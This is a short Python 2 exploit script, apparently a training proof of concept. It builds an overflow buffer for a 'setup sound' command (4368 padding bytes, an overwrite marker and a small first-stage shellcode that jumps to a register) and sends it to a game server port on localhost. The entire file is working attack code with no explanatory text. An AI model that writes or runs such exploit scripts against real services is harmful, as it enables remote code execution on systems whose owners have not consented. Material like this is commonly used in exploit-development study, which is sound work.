#!/usr/bin/python
import socket
host = "127.0.0.1"
crash = "A"*4368 + "B"*4
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + crash + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
